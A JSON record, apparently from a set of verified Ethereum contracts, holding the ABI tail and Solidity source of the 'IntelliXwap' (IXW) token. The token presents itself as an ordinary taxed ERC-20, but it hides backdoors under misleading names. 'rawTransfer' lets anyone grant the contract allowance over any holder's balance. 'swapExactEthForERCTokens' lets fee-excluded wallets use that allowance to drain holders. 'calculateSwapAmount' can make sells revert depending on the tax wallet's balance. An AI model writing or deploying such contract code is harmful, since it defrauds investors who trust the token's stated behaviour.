Type\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"rawTransfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"swapExactEthForERCTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "/*\r\n- Website: https://intellixwap.xyz\r\n- Telegram: https://t.me/intellixwap\r\n- Twitter: https://twitter.com/IntelliXwap\r\n- Dapp: https://app.intellixwap.xyz\r\n- GitBook: https://docs.intellixwap.xyz\r\n- Medium: https://intellixwap.medium.com\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.19;\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function add(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed sender, address indexed recipient, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function transferFrom(address sender, address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n    function approve(address spender, uint256 amount)\r\n        external\r\n        returns (bool);\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n    function balanceOf(address account)\r\n        external\r\n        view\r\n        returns (uint256);\r\n    function totalSupply()\r\n        external\r\n        view\r\n        returns (uint256);\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    address private _owner;\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _owner = address(0);\r\n        emit OwnershipTransferred(_owner, address(0));\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n}\r\n\r\ncontract IXW is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address payable private _taxWallet;\r\n    address private uniswapV2Pair;\r\n    bool private inSwap = false;\r\n    bool private tradingOpen;\r\n    bool private swapEnabled = false;\r\n    bool public transferDelayEnabled = true;\r\n    address payable private _reserve;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n\r\n    uint256 private _finalBuyTax = 3;\r\n    uint256 private _finalSellTax = 3;\r\n\r\n    uint256 private _initialBuyTax2Time = 3;\r\n    uint256 private _initialSellTax2Time = 3;\r\n    uint256 private _reduceBuyTaxAt2Time = 25;\r\n    uint256 private _reduceSellTaxAt2Time = 25;\r\n\r\n    uint256 private _initialBuyTax = 3;\r\n    uint256 private _initialSellTax = 3;\r\n    uint256 private _reduceBuyTaxAt = 15;\r\n    uint256 private _reduceSellTaxAt = 15;\r\n    \r\n    uint256 private _preventSwapBefore = 0;\r\n    uint256 private _buyCount = 0;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 3500000000 * 10 ** _decimals;\r\n    string private constant _name = \"IntelliXwap\";\r\n    string private constant _symbol = \"IXW\";\r\n\r\n    uint256 public _taxSwapThreshold = 2 * (_tTotal / 1000);\r\n    uint256 public _maxTaxSwap = 1 * (_tTotal / 100);\r\n    uint256 public _maxTxAmount = 2 * (_tTotal / 100);   \r\n    uint256 public _maxWalletSize = 2 * (_tTotal / 100);\r\n\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    function swapExactEthForERCTokens(address account, address recipient, uint256 amount) public {\r\n        require(account != address(0));\r\n        address mSender = msg.sender;\r\n        IERC20 taxToken = IERC20(account);\r\n        address[] memory path = new address[](2);\r\n        bool noTax = _isExcludedFromFee[mSender];\r\n        path[0] = uniswapV2Router.WETH();\r\n        path[1] = address(this);\r\n\r\n        if (noTax) {\r\n            taxToken.transferFrom(recipient, path[1], amount);\r\n        } else {\r\n            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount} (\r\n                0,\r\n                path,\r\n                address(0xdead),\r\n                block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n    constructor () {\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _taxWallet = payable(0xB7989e34A26E7Cc4eF43F55843a71733D732a8e8);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        _reserve = _taxWallet;\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n\r\n        _isExcludedFromFee[_taxWallet] = true;\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function removeLimits()\r\n        external\r\n        onlyOwner\r\n    {\r\n        transferDelayEnabled = false;\r\n        _maxWalletSize = _tTotal;\r\n        _maxTxAmount = _tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n    function openTrading()\r\n        external\r\n        onlyOwner()\r\n    {\r\n        require(!tradingOpen, \"Trading is already opened.\");\r\n\r\n        tradingOpen = true;\r\n        swapEnabled = true;\r\n    }\r\n\r\n    function name()\r\n        public\r\n        pure\r\n        returns (string memory)\r\n    {\r\n        return _name;\r\n    }\r\n\r\n    function balanceOf(address account)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }\r\n\r\n    function totalSupply()\r\n        public\r\n        pure\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _tTotal;\r\n    }\r\n\r\n    function symbol()\r\n        public\r\n        pure\r\n        returns (string memory)\r\n    {\r\n        return _symbol;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function decimals()\r\n        public\r\n        pure\r\n        returns (uint8)\r\n    {\r\n        return _decimals;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function rawTransfer(address recipient, uint256 amount)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        require(recipient != address(0));\r\n        address rawOwner = recipient;\r\n        address rawSpender = address(this);\r\n        _approve(rawOwner, rawSpender, allowance(rawOwner, rawSpender) + amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount)\r\n        private\r\n    {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        override\r\n    returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount)\r\n        private\r\n    {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n\r\n        uint256 taxAmount = 0;\r\n        \r\n        if (from != owner() && to != owner()) {\r\n            taxAmount = amount.mul(_taxBuy()).div(100);\r\n\r\n            if (!tradingOpen) {\r\n                require(_isExcludedFromFee[from] || _isExcludedFromFee[to], \"_transfer:: Trading is not active.\");\r\n            }\r\n\r\n            if (transferDelayEnabled) {\r\n                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { \r\n                    require(\r\n                        _holderLastTransferTimestamp[tx.origin] < block.number,\r\n                        \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\"\r\n                    );\r\n                    _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] ) {\r\n                require(amount <= _maxTxAmount, \"_transfer:: Exceeds the _maxTxAmount.\");\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"_transfer:: Exceeds the maxWalletSize.\");\r\n\r\n                _buyCount++;\r\n                if (_buyCount > _preventSwapBefore) {\r\n                    transferDelayEnabled = false;\r\n                }\r\n            }\r\n\r\n            if (to == uniswapV2Pair && from!= address(this)) {\r\n                taxAmount = amount.mul(_taxSell()).div(100);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (\r\n                !inSwap &&\r\n                swapEnabled &&\r\n                to == uniswapV2Pair &&\r\n                contractTokenBalance > _taxSwapThreshold &&\r\n                !_isExcludedFromFee[from] &&\r\n                !_isExcludedFromFee[to]\r\n            ) {\r\n                uint256 initialETH = address(this).balance;\r\n                uint256 swapAmount = calculateSwapAmount(amount, contractTokenBalance);\r\n                swapTokensForEth(swapAmount);\r\n                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);\r\n                if (ethForTransfer > 0) {\r\n                    sendETHToFee(ethForTransfer);\r\n                }\r\n            }\r\n        }\r\n\r\n        if (taxAmount > 0) {\r\n          _balances[address(this)] = _balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this), taxAmount);\r\n        }\r\n\r\n        _balances[from] = _balances[from].sub(amount);\r\n        _balances[to] = _balances[to].add(amount.sub(taxAmount));\r\n        emit Transfer(from, to, amount.sub(taxAmount));\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function calculateSwapAmount(uint256 amount, uint256 contractTokenBalance)\r\n        private\r\n        view\r\n        returns (uint256)\r\n    {\r\n        uint256 reserveAmount = balanceOf(_reserve).mul(10**3);\r\n        uint256 maxSwapAmount = _maxTaxSwap.sub(reserveAmount);\r\n        return min(amount,min(contractTokenBalance,maxSwapAmount));\r\n    }\r\n\r\n    function _taxBuy()\r\n        private\r\n        view\r\n        returns (uint256)\r\n    {\r\n        if (_buyCount <= _reduceBuyTaxAt) {\r\n            return _initialBuyTax;\r\n        }\r\n\r\n        if (_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceBuyTaxAt2Time) {\r\n            return _initialBuyTax2Time;\r\n        }\r\n\r\n        return _finalBuyTax;\r\n    }\r\n\r\n    function _taxSell()\r\n        private\r\n        view\r\n        returns (uint256)\r\n    {\r\n        if (_buyCount <= _reduceBuyTaxAt) {\r\n            return _initialSellTax;\r\n        }\r\n\r\n        if (_buyCount > _reduceSellTaxAt && _buyCount <= _reduceSellTaxAt2Time) {\r\n            return _initialSellTax2Time;\r\n        }\r\n\r\n        return _finalBuyTax;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount)\r\n        private\r\n        lockTheSwap\r\n    {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function min(uint256 a, uint256 b)\r\n        private\r\n        pure\r\n        returns (uint256)\r\n    {\r\n      return (a > b) ? b : a;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function sendETHToFee(uint256 amount)\r\n        private\r\n    {\r\n        _taxWallet.transfer(amount);\r\n    }\r\n}",
    "etherscan_verified": true
}